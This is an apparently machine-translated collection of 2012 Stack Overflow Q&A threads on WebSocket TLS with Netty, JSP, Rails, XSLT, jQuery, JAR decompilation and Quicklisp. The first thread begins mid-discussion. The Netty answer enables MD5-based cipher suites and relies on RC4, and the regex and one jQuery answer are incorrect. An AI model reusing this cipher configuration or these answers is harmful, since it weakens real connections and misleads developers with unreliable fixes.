我在 iOS 上使用 SocketRocket 或 Unitt Web 套接字库来执行安全 Web 套接字时遇到了同样的问题。我可以控制 Java Web 套接字服务器 - Netty - 并且可以详细观察服务器端 SSL/TLS 数据。我使用端口 6970 作为套接字。

使用 TLS 握手正确打开客户端 wss 套接字后，我在第一次写入客户端数据时收到服务器错误，即 Web 套接字握手。客户端写入 202 字节，服务器接收 272 字节，服务器端消息验证码失败。我在服务器跟踪中看到我的客户端数据，但它有 8 个字节的垃圾预置。

首先，我在服务器上尝试了具有相同结果的 SocketRocket 库——良好握手后的 MAC 错误。我的 Unitt 客户端的 android 版本运行良好。我的 JavaScript 安全 Web 套接字代码也很好用。

在 iOS / XCode 上，我可以调试 Unitt/AsyncSocket/doSendBytes 中的 CFWriteStreamWrite(...) - 它报告确实写入了 202 个客户端数据字节。但我不知道如何进一步调试。在某个地方，iOS TLS 框架在发送过程中破坏了我的客户端数据——我想。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T21:06:39.363

通过过滤掉某些与 iOS 不兼容的椭圆曲线密码套件，我能够让我的 iOS 安全 Web 套接字与我的 Java Netty 服务器一起运行。这是我的代码...

```
/** the enabled SSL cipher suites */
private static String[] enabledCipherSuites;
/** the enabled SSL cipher suites lock */
private static final Object ENABLED_CIPHER_SUITES_LOCK = new Object();
/** the iOS incompatible cipher suites */
private static final List<String> iOSIncompatibleCipherSuites = new ArrayList<>();

/** Configures the SSL engine for client or for the server. Arranges the enabled ciphers to favor the
* most secure over the less secure, and omits the least secure ciphers.  Requires that the SSL server
* authenticate the client.
*
* @param sslEngine the SSL engine
* @param useClientMode the indicator whether the SSL engine is operating in client mode
* @param needClientAuth the indicator whether the server authenticates the client's SSL certificate
*/
public static synchronized void configureSSLEngine(
         final SSLEngine sslEngine,
         final boolean useClientMode,
         final boolean needClientAuth) {
  //Preconditions
  assert sslEngine != null : "sslEngine must not be null";

  if (useClientMode) {
    LOGGER.info("configuring SSL engine for the client side of the connection");
    sslEngine.setUseClientMode(true);
    sslEngine.setNeedClientAuth(false);
  } else {
    if (needClientAuth) {
      LOGGER.info("configuring SSL engine for the server side of the connection with required client authorization");
    } else {
      LOGGER.info("configuring SSL engine for the server side of the connection without required client authorization");
    }
    sslEngine.setUseClientMode(false);
    sslEngine.setNeedClientAuth(needClientAuth);
 }
  synchronized (ENABLED_CIPHER_SUITES_LOCK) {
    if (enabledCipherSuites == null) {
      iOSIncompatibleCipherSuites.add("TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384");
      iOSIncompatibleCipherSuites.add("TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256");
      iOSIncompatibleCipherSuites.add("TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA");
      iOSIncompatibleCipherSuites.add("TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA");

      // TLS_ECDHE_RSA_WITH_RC4_128_SHA is the negotiated cipher suite for iOS

      // select and arrange the highest security cipher suites and cache the result
      final String[] supportedCipherSuites = sslEngine.getSupportedCipherSuites();
      final List<String> enabledCipherSuitesList = new ArrayList<>(supportedCipherSuites.length);
      // The first pass selects 256 bit ciphers available with the Java Cryptography Extension (JCE)
      // Unlimited Strength Jurisdiction Policy Files, downloaded and installed from http://java.sun.com/javase/downloads/index.jsp .
      for (final String supportedCipherSuite : supportedCipherSuites) {
        if (supportedCipherSuite.contains("_256_") && !supportedCipherSuite.contains("_anon_")) {
          enabledCipherSuitesList.add(supportedCipherSuite);
        }
      }
      // The second pass selects 128 bit ciphers that use SHA hashing - its more secure than MD5 but slower.
      for (final String supportedCipherSuite : supportedCipherSuites) {
        if (supportedCipherSuite.contains("_128_") && !supportedCipherSuite.endsWith("_MD5") && !supportedCipherSuite.contains("_anon_")) {
          enabledCipherSuitesList.add(supportedCipherSuite);
        }
      }
      // The third pass selects 128 bit ciphers that use MD5 hashing.
      for (final String supportedCipherSuite : supportedCipherSuites) {
        if (supportedCipherSuite.contains("_128_") && supportedCipherSuite.endsWith("_MD5") && !supportedCipherSuite.contains("_anon_")) {
          enabledCipherSuitesList.add(supportedCipherSuite);
       }
      }
      // The fourth pass removes the iOS incompatible cipher suites
      enabledCipherSuitesList.removeAll(iOSIncompatibleCipherSuites);

      if (LOGGER.isDebugEnabled()) {
        LOGGER.debug("enabledCipherSuites: " + enabledCipherSuitesList);
      }
      final int enabledCipherSuitesList_size = enabledCipherSuitesList.size();
      enabledCipherSuites = new String[enabledCipherSuitesList_size];
      for (int i = 0; i < enabledCipherSuitesList_size; i++) {
        enabledCipherSuites[i] = enabledCipherSuitesList.get(i);
      }
    }
    sslEngine.setEnabledCipherSuites(enabledCipherSuites);
  }
} 
```

# jsp - JSP - 从下拉菜单选择中创建日期对象

> ID：11271127
> 
> 赞同：-1
> 
> 时间：2012-06-30T03:16:12.280
> 
> 标签：jsp, date, object, creation

我有一个用 HTML 创建的下拉菜单，其中包含两个日期和一个提交按钮。

这是代码

```
<table>
  <tr>
   <td>  Date:  </td>
   <td> <select name="date"> 
      <option> July 02,2012 </option>
      <option> July  06,2012 </option>
      </select> 
   </td>
 </tr>
</table>
<input type="submit" value="Submit"> 
```

表单操作链接到 JSP 页面。我必须根据此下拉菜单中的选择创建一个日期对象。

到目前为止我做了什么

```
 <tr>
   <td>  Date:  </td>
   <td> <%= request.getParameter("date")%>   </td>
 </tr> 
```

我知道我必须做类似的事情

```
Date date = new date(); 
```

但我不完全明白该放在哪里或如何开始？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:56:15.020

`request.getParameter("date")`返回一个字符串，因此您必须将其解析为 Date 对象。您可以使用 Java 的[`SimpleDateFormat`](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)类来执行此操作，如下所示：

```
String dateStr = request.getParameter("date");
SimpleDateFormat dateFormatter = new SimpleDateFormat("MMMM dd, yyyy");
Date dateObj = dateFormatter.parse(dateStr); 
```

不过，在尝试此操作之前，您需要确保下拉列表中的日期在格式上都是一致的。换句话说，使所有`<option>`元素的间距和尾随零一致。

# c++ - 使用 pthread 解决 N 个皇后难题

> ID：11271128
> 
> 赞同：2
> 
> 时间：2012-06-30T03:16:27.490
> 
> 标签：c++, multithreading, algorithm, pthreads

我知道如何使用回溯和递归来解决 n 个皇后难题。

我在想如何使用多线程来优化它。

我正在尝试使用 p 线程。

基本上我无法理解 top 在哪里应用线程，以及在哪里加入线程。

由于这是递归，我也无法理解线程在这里如何工作。

--

谢谢

阿洛克 Kr.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T03:47:39.380

一种方法是使用队列将每个扩展放入队列而不是递归。有一个线程池弹出一个扩展并处理它：

```
create a state with an empty board and put it into the queue
create N threads with the following function 
```

线程函数：

```
while not done:
  1) pop a state S from the queue (use locks), if queue is empty,
     wait on a semaphore until there is an S
  2) expand state S
  2a) if S has feasible children then put them into the queue 
      except for one state SS, call it S and goto 2 
     (also signal the semaphore)
  2b) if S has no feasible children goto 1
end while 
```

您可以针对不同的算法对其进行修改

# android - 未收到取消/退款购买的应用内通知

> ID：11271129
> 
> 赞同：1
> 
> 时间：2012-06-30T03:17:18.613
> 
> 标签：android

我正在尝试使用[Android Billing Library](https://github.com/robotmedia/AndroidBillingLibrary)实现应用内计费。我已经浏览了静态应用内响应，`android.test.purchased`并且`android.test.canceled`它们`android.test.refunded`都可以正常工作。

使用我自己的产品 ID，我确认它`PurchaseState.PURCHASED`有效。以及`RESTORE_TRANSACTIONS`. 并且`PurchaseState.CANCELED`也有效，但前提是在订单收费之前取消。但是，在对订单收费后，如果我取消购买或退款，则不会收到应用内消息。

我在 logcat 中没有看到任何关于原因的迹象。这些消息是否在实际退款被退回之前才发送，它们是否由于其他原因需要一段时间（自从我在我的一个测试帐户上退还购买后已经快 24 小时了，它仍然显示应用内购买），是这是一个测试的东西或任何想法？

# ruby-on-rails - Rails：从特定列获取数据？

> ID：11271131
> 
> 赞同：0
> 
> 时间：2012-06-30T03:18:17.167
> 
> 标签：ruby-on-rails, activerecord, codeblocks, polymorphic-associations

我只想从特定列中提取数据，但返回的是整个记录。

我进入我的控制台试图看看引擎盖下发生了什么，但结果让我感到困惑。

如何只返回每条记录的状态？

```
1.9.3p194 :001 > company = Company.first
Company Load (0.1ms)  SELECT "companies".* FROM "companies" LIMIT 1
=> #<Company id: 1, name: "Supreme WIndows", created_at: "2012-06-24 04:12:02", updated_at: "2012-06-24 04:12:02"> 
1.9.3p194 :002 > company.requests
Request Load (0.1ms)  SELECT "requests".* FROM "requests" WHERE "requests"."requestable_id"    = 1 AND "requests"."requestable_type" = 'Company'
=> [#<Request id: 1, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:25:11", updated_at: "2012-06-30 01:25:11", profile_id: nil>, #
     <Request id: 2, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:28:16", updated_at: "2012-06-30 01:28:16", profile_id: nil>, #
     <Request id: 3, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:32:55", updated_at: "2012-06-30 01:32:55", profile_id: nil>, #
     <Request id: 4, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 02:46:07", updated_at: "2012-06-30 02:46:07", profile_id: nil>] 
1.9.3p194 :003 > company.requests.status
NoMethodError:   Request Load (0.2ms)  SELECT "requests".* FROM "requests" WHERE "requests"."requestable_id" = 1 AND "requests"."requestable_type" = 'Company'
undefined method `status' for #<ActiveRecord::Relation:0x007fdbd57e1ba8>
from /Users/Aaron/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-3.2.3/lib/active_record/relation/delegation.rb:45:in `method_missing'
from /Users/Aaron/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-3.2.3/lib/active_record/associations/collection_proxy.rb:100:in `method_missing'
from (irb):3
from /Users/Aaron/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands/console.rb:47:in `start'
from /Users/Aaron/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands/console.rb:8:in `start'
from /Users/Aaron/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands.rb:41:in `<top (required)>'
from script/rails:6:in `require'
from script/rails:6:in `<main>'
1.9.3p194 :004 > company.requests.first.status
=> nil 
1.9.3p194 :005 > company.requests.each do |request|
1.9.3p194 :006 >     request.status
1.9.3p194 :007?>   end
=> [#<Request id: 1, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:25:11", updated_at: "2012-06-30 01:25:11", profile_id: nil>, # 
     <Request id: 2, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:28:16", updated_at: "2012-06-30 01:28:16", profile_id: nil>, #
     <Request id: 3, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 01:32:55", updated_at: "2012-06-30 01:32:55", profile_id: nil>, #
     <Request id: 4, status: nil, requestable_id: 1, requestable_type: "Company", created_at: "2012-06-30 02:46:07", updated_at: "2012-06-30 02:46:07", profile_id: nil>] 
1.9.3p194 :008 > 
```

MCV 的所有代码都在以下问题 [Rails 中：如何创建多态关系/友谊模型](https://stackoverflow.com/questions/11239486/rails-how-to-create-polymorphic-relationship-friendship-model)

我基于 ryan bates 多态关联代码 [https://github.com/railscasts/154-polymorphic-association-revised/tree/master/blog-after](https://github.com/railscasts/154-polymorphic-association-revised/tree/master/blog-after)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T03:22:18.587

Rails 3.1 或更高版本`pluck`正是为此引入了该方法`company.requests.pluck(:status)`。这会查询数据库的状态并返回一个数组。

在旧版本中，您可以 user `company.requests.select(:status).map(&:status)`，在这里您为每个请求实例化一个模型，然后只提取状态，这要花费更多。

# regex - 简单的正则表达式搜索+替换

> ID：11271132
> 
> 赞同：0
> 
> 时间：2012-06-30T03:18:51.990
> 
> 标签：regex

我发现所有与正则表达式相关的教程都很难理解，所以在此先感谢您在这个愚蠢简单的问题上帮助我。

我正在尝试将形式 0n 的字符串更改为形式 n 所以 "02" => "2" 和 "06" => "6"

我知道搜索正则表达式必须是 0[0-9]，但我不知道替换正则表达式必须是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:24:00.813

搜索正则表达式：

```
*(0)[0-9]+* 
```

替换 $1，这将是组 1，也就是`0`用 ""

# android - 安卓平板180度旋转

> ID：11271135
> 
> 赞同：0
> 
> 时间：2012-06-30T03:19:31.833
> 
> 标签：android, orientation

我正在为平板设备开发一个应用程序，只需要横向。

如果我将设备旋转 180 度，应用程序仍将处于横向但颠倒状态。

如何检测 180 度旋转并旋转应用程序？

# java - 如何查看 JAR 文件中的源代码？

> ID：11271138
> 
> 赞同：11
> 
> 时间：2012-06-30T03:20:49.687
> 
> 标签：java

我从 sourceforge 下载了 LAN Messenger 的代码。它是一个可执行的 JAR 文件。
你双击它，你的信使就会启动。

我想研究源代码。我怎么做？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2014-02-07T06:22:59.770

[从 .jar 文件中提取源代码](https://stackoverflow.com/questions/5107187/extract-source-code-from-jar-file)

(1)使用京东图形界面（[http://jd.benow.ca/](http://jd.benow.ca/)）。打开应用程序，将 JAR 文件拖放到其中。

(2)您可以使用以下命令提取 jar 文件：

```
jar xf filename.jar 
```

[参考：Oracle 的 JAR 文档](https://docs.oracle.com/javase/8/docs/technotes/tools/windows/jar.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T03:29:25.790

Sourceforge 有指向源的链接。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-30T04:30:26.380

打开 JAR 文件适用于任何支持 .ZIP 文件格式的软件，例如 WinRAR。

但是如果你想访问源代码，它会变得有点棘手，因为在 JAR 文件中，Java 代码已经“预编译”成 Java 的字节码。幸运的是，有一种（粗略的）方法可以将字节码反编译回（通常）可读的 Java 源代码。

有很多程序可以做到这一点，我个人最喜欢的是 JAD ( [http://www.varaneckas.com/jad/](http://www.varaneckas.com/jad/) )。

由于您在 sourceforge 上找到了该项目，因此代码很可能没有被混淆。虽然，如果是的话，你仍然可以反编译它，但它可能很难阅读和理解。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-30T03:27:35.670

你的电脑有eclipse吗？你可以将jar文件添加到项目中，然后你可以看到源代码

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-11-25T02:37:31.357

IntelliJ 在这种类型的事情上很棒。只需像打开任何其他项目一样打开它，它就会为您反编译它。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-06-30T05:01:39.933

只有两个选项可用 1\. 使用 Cavaj 或 JAD 等反编译器工具。源可能难以更改。如果它用于理解功能性，它可能会有所帮助。2\. SourceForge 也应该有源文件的链接。我想在 SourceForge 上再次检查一下是值得的。

# xml - XSLT 交换元素值

> ID：11271149
> 
> 赞同：2
> 
> 时间：2012-06-30T03:23:23.110
> 
> 标签：xml, xslt, gpx

我正在尝试使用 xslt 交换 GPX 文件 (XML) 中元素**名称**和**cmt的值。**

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<gpx xmlns="http://www.topografix.com/GPX/1/1" creator="GPS TrackMaker" version="1.1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
    <metadata>
        <link href="http://www.trackmaker.com">
            <text>Geo Studio Tecnology Ltd</text>
        </link>
        <time>2012-06-29T21:53:25Z</time>
        <bounds minlat="37.772562" minlon="-124.550080" maxlat="49.323978" maxlon="-122.404474"/>
    </metadata>
    <wpt lat="46.189580000" lon="-123.824460000">
        <ele>0.000000</ele>
        <name>G02010</name>
        <cmt>Columbia River Maritime Museum</cmt>
        <desc>Columbia River Maritime Museum</desc>
        <sym>Museum</sym>
    </wpt>
    <wpt lat="46.189010000" lon="-123.824370000">
        <ele>0.000000</ele>
        <name>G02020</name>
        <cmt>Marine Dr/17th St</cmt>
        <desc>Marine Dr/17th St</desc>
        <sym>Waypoint</sym>
    </wpt>
</gpx> 
```

改造后：

```
...
<name>Columbia River Maritime Museum</name>
<cmt>G02010</cmt>
... 
```

有人可以为此显示正确的xslt吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T03:35:21.880

使用标识转换并覆盖这些元素的值：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:gpx="http://www.topografix.com/GPX/1/1">
    <xsl:template match="@*|node()">
        <xsl:copy>
            <xsl:apply-templates select="@*|node()"/>
        </xsl:copy>
    </xsl:template>
    <xsl:template match="gpx:name/text()">
        <xsl:value-of select="../../gpx:cmt/text()"/>
    </xsl:template>
    <xsl:template match="gpx:cmt/text()">
        <xsl:value-of select="../../gpx:name/text()"/>
    </xsl:template>
</xsl:stylesheet> 
```

请注意，`text()`如果您的实际需求（或源输入）更复杂，您也可以直接匹配元素（而不是它们）。

看起来像这样：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:gpx="http://www.topografix.com/GPX/1/1">
    <xsl:template match="@*|node()">
        <xsl:copy>
            <xsl:apply-templates select="@*|node()"/>
        </xsl:copy>
    </xsl:template>
    <xsl:template match="gpx:name">
        <xsl:copy>
            <xsl:apply-templates select="@*|../gpx:cmt/text()"/>
        </xsl:copy>
    </xsl:template>
        <xsl:template match="gpx:cmt">
        <xsl:copy>
            <xsl:apply-templates select="@*|../gpx:name/text()"/>
        </xsl:copy>
    </xsl:template>
</xsl:stylesheet> 
```

这是一个稍微更通用的解决方案，但考虑到您提供的输入，第一个就足够了。

# jquery - 此表格错误的原因是什么？

> ID：11271150
> 
> 赞同：0
> 
> 时间：2012-06-30T03:23:33.323
> 
> 标签：jquery, mysql, forms

我正在使用此代码并收到警报消息：“表单保存失败，请联系您的管理员”

我试图了解错误的原因。我不是创建代码的人，我只是出于教育目的尝试：。

我已经测试了我的数据库连接并且它运行良好。我还确定在我点击提交按钮之前表单字段已正确且完整地填写。

你能告诉我可能的原因吗？

这是我在我们网站上上传的表格的链接： [http ://www.ssagroup.com/_form/aj.html](http://www.ssagroup.com/_form/aj.html)

```
$("document").ready(function() {
    $("#personal_details").submit(function() {
        processDetails();
        return false;
    });
});

function processDetails() {
    var errors = '';

    // Validate name
    var name = $("#personal_details [name='name']").val();
    if (!name) {
        errors += ' - Please enter a name\n';
    }
    // Validate age range
    var age_range = $("#personal_details [name='age_range']").val();
    if (!age_range) {
        errors += ' - Please select and age range\n';
    }
    // Validate sports selection
    var sports = $("#personal_details [name='sports[]']:checked").length;
    if (!sports) {
        errors += ' - Please select your favourite sports\n';
    }

    if (errors) {
        errors = 'The following errors occurred:\n' + errors;
        alert(errors);
        return false;
    } else {
        // Submit our form via Ajax and then reset the form
        $("#personal_details").ajaxSubmit({success:showResult});
        return false;
    }

}

function showResult(data) {
    if (data == 'save_failed') {
        alert('Form save failed, please contact your administrator');
        return false;
    } else {
        $("#personal_details").clearForm().clearFields().resetForm();
        alert('Form save success');
        return false;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T03:26:04.403

它在后端出现错误。ajax 调用的结果是`save_failed`触发`if (data == 'save_failed') {`

它在后端失败的原因可能有很多....而且无法确定，您必须发布 php 代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T03:25:52.603

嗨，请这样做删除空格：你能轻弹 jsfiddle 希望你正在采购正确的库。

我很犹豫要不要点击外部链接

下面的 Anyhoo 应该会有所帮助；）

```
 $("#personal_details [name='name']").val();
                     ^----------------------------Sapce here 
```

尝试这个

```
 $("#personal_details[name='name']").val(); 
```

**进一步**似乎在这里工作：

![在此处输入图像描述](../Images/3d8b61b2ad292b179afbdeeebd1e95eb.png)

# deobfuscation - 自动变量重命名字典

> ID：11271152
> 
> 赞同：0
> 
> 时间：2012-06-30T03:24:09.673
> 
> 标签：deobfuscation

我正在开发一个 Java 反混淆工具，我计划实现的功能之一是用更容易记住的名称自动重命名类和方法。我的计划是有一个文本文件，其中包含数百个基于随机独特英语单词的可能名称。但是，我不确定从哪里可以获得这样的列表。

我遇到了[这个](http://search.cpan.org/~jjore/B-Deobfuscate-0.20/lib/B/Deobfuscate.pod)，它对 Perl 做同样的事情。但是，尚不清楚它使用的是什么字典。

有没有人对获得此类列表的最佳方式提出建议？理想情况下，这些词都是独特且令人难忘的，并且不会与常见的编程关键字或术语发生冲突。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:27:25.453

如果您使用的是 unix，则可以尝试：

```
cat /usr/share/dict/words > words.txt 
```

否则有这个[链接](http://zyzzyva.net/wordlists.shtml)

# common-lisp - Quicklisp 无法为 Hunchentoot 安装 LIBSSL

> ID：11271153
> 
> 赞同：5
> 
> 时间：2012-06-30T03:24:22.123
> 
> 标签：common-lisp, clisp, quicklisp

我今天在我的 Win7 PC 上安装了 CLisp。请不要批评我的环境选择，但如果此特定设置存在与 Quicklisp 和 Hunchentoot 相关的缺陷，请随时指出它们。我下载并安装了 Quicklisp 并尝试使用它来获取 Hunchentoot - 但是，我似乎有错误。

我输入 (ql:quickload "hunchentoot") 一切似乎都很好，但一方面 - CL+SSL？无论出于何种原因，该特定组件都不会安装。无论如何，这是输出：

```
*** - Unable to load foreign library (LIBSSL).
FFI:OPEN-FOREIGN-LIBRARY: Cannot open library "libssl32.dll" 
```

有谁知道这意味着什么，或者我如何安装这个难以捉摸的库？我试图通过 Quicklisp 安装 CL+SSL，我得到了同样的错误。“无法打开库“libssl32.dll”

编辑：我尝试使用 LispBox 安装 Hunchentoot 并得到完全相同的错误。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-30T07:15:50.587

Quicklisp 只安装 ASDF 系统。然后，如果您查看 [文档](http://common-lisp.net/project/cl-plus-ssl/)， `CL+SSL`您可以阅读：

```
Note that you need the libssl-dev package on Debian to load this
package without manual configuration.

OpenSSL binaries for Windows may be found at
http://www.slproweb.com/products/Win32OpenSSL.html (slproweb.com
is a 3rd party; if you have questions about the OpenSSL installer
they provide, please ask in the mailing list specified on the
linked page). 
```

结论：你必须自己安装 OpenSSL。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-21T15:02:47.197

[对于未来可能的人：使用带有lispbox](http://common-lisp.net/project/lispbox/)的 Quicklisp （同样，不限于）安装/加载 Drakma（在 Windows 8 下，但可能不限于 win ）将输出相同的错误。

一个快速而肮脏的解决方案是使用“跳过加载包”选项，它应该让你在没有 SSL 的情况下工作 Drakma :)

# javascript - Javascript 使用 for 循环设置多个 onmouseover 事件

> ID：11271157
> 
> 赞同：0
> 
> 时间：2012-06-30T03:25:38.833
> 
> 标签：javascript, loops, onmouseover

抱歉，我是 javascript 新手，所以如果我的编码风格很奇怪，请指出

这是我所拥有的：

```
document.getElementById("img1-container").onmouseover = function(){increaseWidth(1)};
document.getElementById("img2-container").onmouseover = function(){increaseWidth(2)};
document.getElementById("img3-container").onmouseover = function(){increaseWidth(3)};
document.getElementById("img4-container").onmouseover = function(){increaseWidth(4)}; 
```

这是我试图将其转换为：

```
for(var i = 1; i <= numimages; i++){
        (function (i) {
            document.getElementById("img"+i+"-container").onmouseover = function(){increaseWidth(i)};
            document.getElementById("img"+i+"-container").onmouseout = decreaseWidth;
        })(i);
    } 
```

我读过这个： [从一系列 onMouseOver 事件中创建一个循环](https://stackoverflow.com/questions/8672416/creating-a-loop-from-a-series-of-onmouseover-events)

```
var numImages = 7;
var totalPercent = 100;
var increaseWidthPercent = 40;
var decreaseWidthPercent = Math.floor((totalPercent-increaseWidthPercent)/numImages);
var originalWidthPercent = Math.floor(totalPercent/numImages);

function increaseWidth(imgNum){
    document.getElementById("img"+imgNum+"-container").style.width = increaseWidthPercent + "%";
    for(var i = 1; i <= numImages; i++){
        if(i != imgNum){
            document.getElementById("img"+i+"-container").style.width = decreaseWidthPercent + "%";
        }
    }   
    return true;
}

function decreaseWidth(){
    for(var i = 1; i <= numImages; i++){
        document.getElementById("img"+i+"-container").style.width = originalWidthPercent + "%";
    }
    return true;
}

function setImageContainers(){  
    /*for(var i = 1; i < 8; i++){
        document.write("<p>document.getElementById(\"img"+i+"-container\").onmouseover = function(){increaseWidth("+i+")};document.getElementById(\"img"+i+"-container\").onmouseout = decreaseWidth;</p>");    
    }*/ 
    document.getElementById("img1-container").onmouseover = function(){increaseWidth(1)};document.getElementById("img1-container").onmouseout = decreaseWidth;

    document.getElementById("img2-container").onmouseover = function(){increaseWidth(2)};document.getElementById("img2-container").onmouseout = decreaseWidth;

    document.getElementById("img3-container").onmouseover = function(){increaseWidth(3)};document.getElementById("img3-container").onmouseout = decreaseWidth;

    document.getElementById("img4-container").onmouseover = function(){increaseWidth(4)};document.getElementById("img4-container").onmouseout = decreaseWidth;

    document.getElementById("img5-container").onmouseover = function(){increaseWidth(5)};document.getElementById("img5-container").onmouseout = decreaseWidth;

    document.getElementById("img6-container").onmouseover = function(){increaseWidth(6)};document.getElementById("img6-container").onmouseout = decreaseWidth;

    document.getElementById("img7-container").onmouseover = function(){increaseWidth(7)};document.getElementById("img7-container").onmouseout = decreaseWidth;
}

function setImageContainers2(){
    for(var i = 1; i <= numimages; i++){
        (function (i) {
            document.getElementById("img"+i+"-container").onmouseover = function(){increaseWidth(i)};
            document.getElementById("img"+i+"-container").onmouseout = decreaseWidth;
        })(i);
    }
}

window.onload = setImageContainers2; 
```

# html - ul 图片文字对齐

> ID：11271168
> 
> 赞同：1
> 
> 时间：2012-06-30T03:28:34.407
> 
> 标签：html, css

我有一个自定义列表菜单样式，但我不确定如何将文本与图像对齐：

![在此处输入图像描述](../Images/a5d978dcc04ab0168efeba4d89596efb.png)

**CSS：**

```
div#main .services{
    width:250px;
}
div#main .services ul li{
    list-style-image: url('../img/tick.png');
}
div#main .services li{
    line-height:20px;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T03:33:17.303

垂直对齐可能会有所帮助（尝试顶部或中间值）：

```
div#main .services li{
    line-height:20px;
    vertical-align: middle;
} 
```

# jquery - 对话框 ui 中的复选框不可选中

> ID：11271172
> 
> 赞同：2
> 
> 时间：2012-06-30T03:29:32.257
> 
> 标签：jquery, jquery-ui, z-index, jquery-ui-dialog

我正在尝试使用 jQuery UI 对话框解决 z-index 问题，类似于问题[Can't select or deselect checkboxes inside jQuery UI Modal Dialog](https://stackoverflow.com/questions/10542327/cant-select-or-deselect-checkboxes-inside-jquery-ui-modal-dialog#comment13640659_10542422)，知道那里有[错误报告](http://bugs.jqueryui.com/ticket/6267 "错误报告")。

因此，在尝试按照建议提升 z-index 时，我添加了以下代码：

```
$('#interface').click(function(evform){
  $('#interface').prop('z-index')=99999;
}); 
```

其中 chrome 和 firefox console.log 状态：

> 未捕获的 ReferenceError：分配中的左侧无效

但是，尽管出现错误，该复选框现在可以工作（每次都抛出控制台错误）。如果我删除有问题的行，复选框将变为“不可点击”。我怎样才能正确编码呢？

我的 HTML：

```
<div id="dialog" title="Loading...">
    <p id="interface">Loading...</p>
</div> 
```

（顺便说一句，我尝试在 中添加内联样式`<p>`，但没有成功：

```
<p id="interface" style="z-index:99999">Loading...</p> 
```

使用 AJAX，我将 '#interface' 的内容替换为有效的复选框 html，例如：

```
<label for="right">
  <input name="right" type="checkbox">
</label> 
```

并且我包含了通常的 jQuery/Dialog UI 文件。

最后一点，我试图发挥创意，因为这不起作用并通过以下方式手动切换复选框：

```
if ($(evform.target).prop('type')=="checkbox"){
      $(evform.target).checked;
} 
```

*** 编辑更新 ***

截至 2013 年 12 月 22 日（EDGE 预发布版）的 jQuery 核心，此错误已得到修复。我希望他们尽快发布稳定版本（我相信它会是 v1.10）！您可以在 jfiddle 中对其进行测试：http: [//jsfiddle.net/tj_vantoll/XXGQA/](http://jsfiddle.net/tj_vantoll/XXGQA/)

[http://bugs.jqueryui.com/ticket/6267](http://bugs.jqueryui.com/ticket/6267)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T03:42:59.947

您必须设置`z-index`on `#dialog`，而不是`#interface`。

您的代码抛出错误，因为您试图为函数调用分配一个值。所以你的代码应该是：

```
$('#interface').click(function(evform){
  $('#dialog').css('z-index', 99999);
}); 
```

或者只是在你的 CSS 上：

```
#dialog { z-index: 99999; } 
```

**更新**

这个解决方案不是万无一失的。为 jQueryUI 提交的错误报告指出，如果复选框`z-index`低于对话框下方的覆盖层，则会出现问题。jQueryUI 似乎以绝对方式比较 z-indexes，这违反了 CSS 标准（但可以理解，考虑到适当的比较可能会占用大量资源）。

因此，实际的解决方案可能取决于您在对话框中设置`z-index`（和）哪些元素。`position`为避免该错误，请勿`z-index`在对话框内使用，或设置一个保证高于（动态）分配给叠加层的值（因此，我的 `99999`建议）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T03:40:41.737

```
$('#interface').click(function(evform){
  $('#interface').prop('z-index')=99999;
}); 
```

应该

```
$('#interface').click(function(evform){
  $('#interface').prop('z-index', 99999);
}); 
```

第二个参数（如果提供）将属性设置为其值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-01T03:07:19.697

问题原来是`return false;`我在点击编码中遇到的问题：

```
$('#interface').click(function(evform){
  *** did stuff here ***

   evform.preventDefault;
   return false; //This is the offending line of code
}); 
```

为了诊断，我想看看页面上的 z-index 更高，所以我添加了：

```
$('*').each(function(){
    if ($(this).css('z-index')>99) { 
        console.log ($(this).css('z-index')+", " + $(this).prop('class'));
    }
}); 
```

